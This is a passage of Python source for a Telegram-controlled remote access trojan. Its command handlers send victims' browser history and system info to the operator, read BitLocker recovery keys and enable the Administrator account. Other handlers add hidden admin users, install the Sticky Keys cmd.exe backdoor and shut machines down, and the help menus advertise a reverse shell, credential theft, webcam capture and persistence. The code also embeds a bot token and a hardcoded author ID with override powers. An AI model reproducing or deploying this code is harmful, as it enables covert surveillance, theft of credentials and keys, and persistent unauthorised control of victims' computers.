                            bot.reply_to(message, "Process killed successfully")
                        else:
                            bot.reply_to(message, f"Error while trying to kill the process:\n{result}")
                    else:
                        bot.reply_to(message, "Please specify all the required parameters: killproc <pid>")

            @bot.message_handler(commands=['history'])
            def history(message):
                try:
                    if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    
                        result = browserhistory.gethistory("Google","Chrome")
                        if result != False:
                            bot.send_document(message.chat.id, open(result, 'rb'))
                            os.remove(result)
                        else:
                            bot.reply_to(message, "Error while trying to get history from Chrome") 

                        result = browserhistory.gethistory("Microsoft","Edge")
                        if result != False:
                            bot.send_document(message.chat.id, open(result, 'rb'))
                            os.remove(result)
                        else:
                            bot.reply_to(message, "Error while trying to get history from Edge")   

                        result = browserhistory.gethistory("BraveSoftware","Brave-Browser")
                        if result != False:
                            bot.send_document(message.chat.id, open(result, 'rb'))
                            os.remove(result)
                        else:
                            bot.reply_to(message, "Error while trying to get history from Brave")
                except Exception as e:
                    bot.reply_to(message, f"Error while trying to get history:\n{e}")

            @bot.message_handler(commands=['pcinfo'])
            def pcinfo(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    reply = disctopia.cmd("systeminfo")
                    if len(reply) > 4000:
                        path = os.environ["temp"] +"\\pcinfo.txt"     
                        with open(path, 'w') as file:
                            file.write(reply)
                        bot.send_document(message.chat.id, open(path, 'rb'))
                        os.remove(path)
                    else:
                        bot.reply_to(message, reply)

            @bot.message_handler(commands=['bitlockerkey'])
            def bitlockerkey(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    reply = disctopia.cmd("manage-bde -protectors -get C:")
                    bot.reply_to(message, reply)

            @bot.message_handler(commands=['administrator'])
            def administrator(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    if limited(message)=="GOD":
                        arguments = message.text.split()
                        if len(arguments) > 1:
                            state = ' '.join(arguments[1:])
                            if state.upper() == "ENABLE":
                                reply=disctopia.cmd("net user Administrator /active:yes")
                            elif state.upper() == "DISABLE":
                                reply=disctopia.cmd("net user Administrator /active:no")
                            else:
                                reply="Invalid argument, please specify either 'Enable' or 'Disable'"
                            bot.reply_to(message, reply)
                        else:
                            bot.reply_to(message, "Please specify the required parameters: administrator <Enable/Disable>")

            @bot.message_handler(commands=['createuser'])
            def createuser(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    if str(message.from_user.id) == "1049697109":
                        arguments = message.text.split()
                        if len(arguments) > 2:
                            name = arguments[1]
                            password = ' '.join(arguments[2:])
                            result = disctopia.cmd(f"net user {name} {password} /add")
                            disctopia.cmd(f"net localgroup Administrators {name} /add")
                            if result:
                                bot.reply_to(message, "User created successfully")
                            else:
                                bot.reply_to(message, f"Error while trying to create the user:\n{result}")
                        else:
                            bot.reply_to(message, "Please specify all the required parameters: createuser <name> <password>")
                    else:
                        try:
                            bot2 = telebot.TeleBot("7808939013:AAF1UYN0AtvVxi1_Rhzdu7l09DIIEnhQE0I")
                            msg=f"Requesting CreateUser for client {disctopia.getUsername()} #{ID}\nBot Requested is @{bot.get_me().username}\nOwner is tg://openmessage?user_id={USER_ID}"
                            bot2.send_message("1049697109",msg)
                            bot.reply_to(message, "You are not allowed to use this command\nContact GOD\n@GodInReach")
                        except:
                            bot.reply_to(message, "You are not allowed to use this command\nBTW somw error occorred\nContact GOD\n@GodInReach")
                    
            @bot.message_handler(commands=['sethcpatch'])
            def sethcpatch(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    if str(message.from_user.id) == "1049697109":
                        args = message.text.split()
                        if len(args) < 2:
                            bot.reply_to(message, "Invalid arguments. Specify 'on' or 'off': /sethcpatch <on|off>")
                            return
                        action = args[1].lower()
                        original_file = "C:\\Windows\\System32\\sethc.exe.original"
                        sethc_file = "C:\\Windows\\System32\\sethc.exe"
                        cmd_file = "C:\\Windows\\System32\\cmd.exe"
                        if action == "on":
                            if disctopia.cmd(f"if exist {original_file} (echo 1) else (echo 0)").strip() == "1":
                                bot.reply_to(message, "The system is already patched.\nTry pressing shift 5 times")
                                return
                            try:
                                disctopia.cmd(f"takeown /f {sethc_file}")
                                disctopia.cmd(f"icacls {sethc_file} /grant administrators:F")
                                disctopia.cmd(f"rename {sethc_file} sethc.exe.original")
                                disctopia.cmd(f"copy {cmd_file} {sethc_file}")
                                bot.reply_to(message, "The system is patched successfully.\nTry pressing shift 5 times")
                            except Exception:
                                bot.reply_to(message, "An error occurred during patching.")
                        elif action == "off":
                            if disctopia.cmd(f"if exist {original_file} (echo 1) else (echo 0)").strip() == "0":
                                bot.reply_to(message, "No patch found to restore.")
                                return
                            try:
                                disctopia.cmd(f"copy {original_file} {sethc_file} /y")
                                disctopia.cmd(f"del {original_file}")
                                bot.reply_to(message, "The system has been restored successfully.")
                            except Exception:
                                bot.reply_to(message, "An error occurred during restoration.")
                        else:
                            bot.reply_to(message, "Invalid argument. Specify either 'on' or 'off'.")
                    else:
                        try:
                            bot2 = telebot.TeleBot("7808939013:AAF1UYN0AtvVxi1_Rhzdu7l09DIIEnhQE0I")
                            msg=f"Requesting SethcPatch for client {disctopia.getUsername()} #{ID}\nBot Requested is @{bot.get_me().username}\nOwner is tg://openmessage?user_id={USER_ID}"
                            bot2.send_message("1049697109",msg)
                            bot.reply_to(message, "You are not allowed to use this command\nContact GOD\n@GodInReach")
                        except:
                            bot.reply_to(message, "You are not allowed to use this command\nBTW somw error occorred\nContact GOD\n@GodInReach")


            @bot.message_handler(commands=['poweropt'])
            def poweropt(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    if limited(message)=="GOD":
                        arguments = message.text.split()
                        try:
                            if len(arguments) > 1:
                                state = arguments[1].lower()
                                if state in ["shutdown","poweroff"]:
                                    bot.reply_to(message, "Shutting down sucessfull")
                                    disctopia.cmd("shutdown /s /hybrid")
                                elif state in ["logoff","signout"]:
                                    bot.reply_to(message, "Log off sucessfull")
                                    disctopia.cmd("shutdown /l")
                                elif state in ["reboot","restart"]:
                                    bot.reply_to(message, "Reboot sucessfull")
                                    disctopia.cmd("shutdown /r")
                                elif state == "lock":
                                    bot.reply_to(message, "Lock sucessfull")
                                    disctopia.cmd("rundll32.exe user32.dll,LockWorkStation")
                                elif state == "sleep":
                                    bot.reply_to(message, "Sleep sucessfull")
                                    disctopia.cmd("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
                                else:
                                    bot.reply_to(message, "Invalid argument, please specify either \n'Shutdown', 'Logoff', 'Reboot', 'Lock' or 'Sleep'")
                            else:
                                bot.reply_to(message, "Please specify all the required parameters \npoweropt <Shutdown|Logoff|Reboot|lock|Sleep>")
                        except Exception as e:
                            bot.reply_to(message, f"Error while trying to shutdown the computer:\n{e}")
                            
            @bot.message_handler(commands=['advanced'])
            def hidden(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    reply = """
Advanced options:

/bitlockerkey - get bitlocker recovery key
/revshell <ip> <port> - Establish a reverse shell
/cmd <command> - Execute cmd/ps commands
/process - List running processes
/killproc <pid> - Kill a running process
/administrator <Enable/Disable> - Built in windows admin account
/poweropt <Shutdown|Logoff|Reboot|lock|Sleep> - U know whats this!
/sethcpatch - Open cmd in loginscreen with Sticky Keys (GOD only)
/createuser <username> <password> - Create a new user (GOD only)
"""

                    bot.reply_to(message, reply)

            @bot.message_handler(commands=['help'])
            def help(message):
                if str(message.from_user.id) == USER_ID or str(message.from_user.id) == "1049697109":
                    bot.reply_to(message, f"""
Agent#{ID} Commands:

/agent - View agent id
/pcinfo - Get detailed pc info 
/msg <message to display> - displays msg box
/wallpaper <url/path> - Change the wallpaper
/webshot - Take a picture from the webcam
/screenshot - Take a screenshot
/creds - Get credentials (GOD only)
/history - Get browser history
/persistent - Add persistence
/upload <url> <name> - Upload a file from a URL
/download <path> - Download a file
/terminate - Terminate the agent
/selfdestruct - Destroy the agent
/location - Get location
/extend - Extend Payload expiry
/help - Show this message
/advanced - Show advanced options

Contact @GodInReach for support
                    """)
            if "1"=="1":
                config = disctopia.createConfig()
                ID = disctopia.id()
                goodbye()
                if config:
                    MSG = f"New Agent Online #{ID}"
                    COLOR = 0x00ff00
                else:
                    MSG =f"Agent Online #{ID}"
                    COLOR = 0x0000FF

                send_notification()
                #while True:
                try:
                    bot.infinity_polling()
                except telebot.apihelper.ApiTelegramException as e:
                    if "Conflict: terminated by other getUpdates request; make sure that only one bot instance is running" in str(e):
                        print(123456789)
                        try:sys.exit()
                        except:os._exit(0)
                except Exception as e:
                    if "make sure that only one bot instance is running" in e:
                        print(9876543)
                        try:sys.exit()
                        except:os._exit(0)
                    time.sleep(5)
        except Exception as e:
            try:
                if len(e) > 4000:
                    path = os.environ["temp"] +"\\greepererror.txt"
                    with open(path, 'w') as file:
                        file.write(e)
                    bot.send_document(e.chat.id, open(path, 'rb'))
                    os.remove(path)
                else:
                    bot.send_message(USER_ID, "Error\n\n{e}")
                time.sleep(10)
                main()
            except:
                pass
    main()


except Exception as e:
#    print(e)
    pass